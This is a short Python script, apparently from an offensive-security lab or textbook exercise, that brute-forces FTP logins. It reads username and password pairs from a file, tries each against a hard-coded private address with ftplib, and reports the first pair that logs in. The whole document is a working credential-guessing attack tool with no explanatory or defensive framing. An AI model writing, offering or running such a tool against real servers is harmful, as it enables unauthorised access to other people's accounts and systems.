import ftplib, time

def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying: " + userName + "/"+passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('[*] ' + str(hostname) + ' FTP Logon Succeeded: '+ userName + "/" + passWord)
            ftp.quit()
            pF.close()
            return (userName, passWord)
        except:
            pass
    pF.close()
    print('[-] Could not brute force FTP credentials.')
    return (None, None)

if __name__ == '__main__':
    host = '10.0.2.6'
    passwdFile = 'userpass.txt'
    (userName, passWord) = bruteLogin(host, passwdFile)
    if userName:
        print(userName,passWord)